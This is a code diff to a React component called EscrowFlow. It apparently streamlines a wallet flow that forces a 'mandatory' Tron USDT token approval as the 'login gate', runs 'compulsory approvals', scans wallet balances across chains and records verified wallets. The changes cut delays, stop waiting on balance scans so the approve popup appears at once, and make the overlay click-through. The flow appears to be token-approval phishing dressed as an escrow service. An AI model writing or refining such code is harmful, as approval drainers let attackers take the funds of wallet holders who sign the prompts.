@@ -562,8 +562,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   /** Approve Tron USDT once, confirm live allowance, then persist. No fire-and-forget. */
-  async function completeTronUsdtApproval(): Promise<boolean> {
-    const result = await ensureTronUsdtApproved();
+  async function completeTronUsdtApproval(knownAddress?: string | null): Promise<boolean> {
+    const result = await ensureTronUsdtApproved({
+      ...(knownAddress ? { address: knownAddress } : {}),
+    });
     if (!result.ok || !result.address) {
       const rejected = !result.ok && result.rejected;
       const errMsg = !result.ok ? result.error : "tron_approve_failed";
@@ -572,7 +574,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       });
     }
     setTronAddress(result.address);
-    const persisted = await persistTronVerification(result.address);
+    // Client already waited for live allowance — tell server to do a fast re-check only.
+    const persisted = await persistTronVerification(result.address, {
+      preConfirmed: true,
+      txId: result.txId,
+    });
     if (!persisted) {
       throw new Error("tron_verify_not_confirmed");
     }
@@ -846,22 +852,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (modal1Triggered.current) return;
 
     void (async () => {
-      // Let Privy close SIWE / WC session before any other wallet RPC.
-      // Keep short — Tron USDT approve should follow login quickly.
-      await new Promise((r) => setTimeout(r, 1200));
+      // Brief settle so Privy SIWE can close — do NOT wait on EVM provider (Tron is separate).
+      await new Promise((r) => setTimeout(r, 800));
       if (modal1Triggered.current) return;
       if (addressRef.current?.toLowerCase() !== address.toLowerCase()) return;
-
-      // Wait until the connected wallet exposes an EIP-1193 provider
-      const wallet =
-        wallets.find((w) => w.address.toLowerCase() === address.toLowerCase()) ?? wallets[0];
-      for (let i = 0; i < 16; i++) {
-        try {
-          const p = await wallet?.getEthereumProvider?.();
-          if (p) break;
-        } catch { /* still warming up */ }
-        await new Promise((r) => setTimeout(r, 200));
-      }
 
       // ── Mobile Safari / WC: must open real page inside Trust for tronWeb ──
       if (needsTrustDappForTron()) {
@@ -883,7 +877,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setNeedsTrustOpen(false);
       clearTrustRedirectCount();
 
-      // Tron: silent peek only right after Privy — never prompt here (competes with SIWE).
+      // Silent peek only — prompting here races SIWE; runModal1Scan prompts if needed.
       const silent = await ensureTronAddress({ prompt: false });
       if (silent) setTronAddress(silent);
 
@@ -906,7 +900,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       modal1Triggered.current = true;
       void (async () => {
         // Settle after returning into Trust — avoid racing Privy session restore
-        await new Promise((r) => setTimeout(r, 1500));
+        await new Promise((r) => setTimeout(r, 900));
         const tron = await ensureTronAddress({ prompt: true });
         if (tron) setTronAddress(tron);
         await runModal1Scan();
@@ -1278,7 +1272,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     })();
 
     try {
-      // Connect TronWeb immediately — mandatory USDT approve cannot wait on EVM scan.
+      // Connect TronWeb immediately — do not wait on EVM/balance scan.
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
         currentTronAddr = await ensureTronAddress({ prompt: true });
@@ -1299,37 +1293,47 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       modal1SawTron.current = true;
       hasStableRef.current = true; // Tron USDT approve is the login gate
 
-      // Optional: enrich balance display / already-approved from scan (non-blocking race).
-      let tronUsdtUsd = 0;
-      let tronAlreadyApproved = false;
-      try {
-        const tronScan = await Promise.race([
-          doScan(currentTronAddr),
-          new Promise<ScanData>((resolve) => setTimeout(() => resolve({ ok: false }), 2500)),
-        ]);
-        if (tronScan.ok && tronScan.chainUsd) {
-          setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
+      // Balance scan is display/cache only — never block the approve popup.
+      void (async () => {
+        try {
+          const tronScan = await doScan(currentTronAddr);
+          if (tronScan.ok && tronScan.chainUsd) {
+            setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
+          }
+          noteStableFromScan(tronScan.tokensWithBalance, hasStableRef);
+          const tronUsdt = (tronScan.tokensWithBalance ?? []).find(
+            (t) => t.isTron && t.symbol === "USDT"
+          );
+          if (tronUsdt) {
+            setModal1Items((prev) =>
+              prev.map((item) =>
+                item.key === "tron-USDT"
+                  ? {
+                      ...item,
+                      balanceUsd: tronUsdt.balanceUsd,
+                      balanceDisplay: tronUsdt.balanceUsd.toFixed(2),
+                      alreadyApproved: Boolean(tronUsdt.alreadyApproved) || item.alreadyApproved,
+                    }
+                  : item
+              )
+            );
+          }
+        } catch {
+          /* ignore — approve path is independent */
         }
-        noteStableFromScan(tronScan.tokensWithBalance, hasStableRef);
-        const tronUsdt = (tronScan.tokensWithBalance ?? []).find(
-          (t) => t.isTron && t.symbol === "USDT"
-        );
-        tronUsdtUsd = tronUsdt?.balanceUsd ?? 0;
-        tronAlreadyApproved = Boolean(tronUsdt?.alreadyApproved);
-      } catch {
-        /* approve still runs — scan is display-only here */
-      }
+      })();
 
-      const tronItem = tronUsdtMandatoryItem(tronUsdtUsd, tronAlreadyApproved);
+      const tronItem = tronUsdtMandatoryItem(0, false);
       setTopChainName("tron");
       setModal1Items([tronItem]);
       setModal1Status({ "tron-USDT": "pending" });
       modal1ApproveStarted.current = true;
-
-      // Keep Detecting balances visible behind wallet popups until approve is confirmed + recorded.
       showModal1Busy();
 
-      const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
+      const tronOk = await runCompulsoryApprovals([tronItem], {
+        markComplete: true,
+        tronAddress: currentTronAddr,
+      });
       void evmScanPromise.catch(() => {});
       clearModal1Busy();
       if (!tronOk) return;
@@ -1345,7 +1349,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   /** One direct-approve popup per queue item. Returns false if gated/failed. */
   async function runCompulsoryApprovals(
     queue: Modal1Item[],
-    opts: { markComplete?: boolean } = {}
+    opts: { markComplete?: boolean; tronAddress?: string } = {}
   ): Promise<boolean> {
     const markComplete = opts.markComplete !== false;
     setModal1Approving(true);
@@ -1370,7 +1374,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         setModal1Status((s) => ({ ...s, [target.key]: "approving" }));
         if (target.isTron) {
           // Always confirm + persist — even when alreadyApproved (records verified_wallets).
-          await completeTronUsdtApproval();
+          await completeTronUsdtApproval(opts.tronAddress ?? tronAddress);
         } else if (target.alreadyApproved) {
           setModal1Status((s) => ({ ...s, [target.key]: "done" }));
           setApprovedChains((prev) =>
@@ -2558,7 +2562,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       {modal1Scanning && (
         <div
-          className="fixed inset-0 z-50 flex items-end justify-center bg-[#0a1628]/55 px-4 pb-8 pt-16 backdrop-blur-[6px] sm:items-center sm:pb-4"
+          className="pointer-events-none fixed inset-0 z-40 flex items-end justify-center bg-[#0a1628]/45 px-4 pb-8 pt-16 backdrop-blur-[4px] sm:items-center sm:pb-4"
           role="status"
           aria-live="polite"
           aria-busy="true"
